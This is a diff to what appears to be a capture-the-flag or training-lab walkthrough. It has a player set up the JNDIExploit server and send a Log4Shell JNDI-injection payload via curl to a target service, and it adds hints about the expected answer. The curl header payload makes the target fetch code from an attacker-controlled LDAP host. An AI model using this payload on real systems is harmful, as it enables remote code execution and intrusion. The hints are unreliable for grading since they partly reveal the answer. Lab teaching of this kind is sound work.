@@ -19,7 +19,7 @@ TLDR; you’re going to trick "sudosingles-optimizer" into connecting to a malic
 You have to set up the server first. To do this, do the following:
 
 1. Open the Terminal Emulator application from the dock on the bottom.
-2. Navigate to the hacker folder by running “cd /config/Desktop/hacker”
+2. Navigate to the "hacker" folder.
 3. Find your private ip address on the LAN network. There are many ways to find your IP address on Linux – I'll leave this one to you. Just make sure you write it down. The IP you find should look something like 10.0.XX.XX or 10.0.XX.XXX
 4. Run the JNDIExploit-1.2-SNAPSHOT.jar file using Java, configuring it to start the malicious server listening on the private IP address you found in step 3 above.
 
@@ -29,7 +29,9 @@ If you see something like the below, you’re on the right track:
 [+] HTTP Server Start Listening on 9001... 
 
 
-To test to make sure it’s running correctly, open another Terminal Emulator window and run the following command, where YOURIP is your local IP: "curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'"
+To test to make sure it’s running correctly, open another Terminal Emulator window and run the following command, where YOURIP is your local IP: 
+
+curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'
 
 To complete this challenge, after you run the above command, enter the last line generated in the Terminal Emulator window where JNDIExploit is running, and hit “Submit.” If your answer doesn’t submit, double-check all the above steps. It could mean that something is wrong with the server command.
 
@@ -64,6 +66,8 @@ If you’re having trouble with JNDIExploit, maybe try looking at the "-h" flag?
 Triple-check to make sure you’re using that IP address.
 
 The answer is the whole last line from the Terminal Emulator window where you first ran the JNDIExploit program. Punctuation and all.
+
+The answer is not "[+] Receive ClassRequest: SpringEchoTemplate.class"
 
 ### HINT 3
 
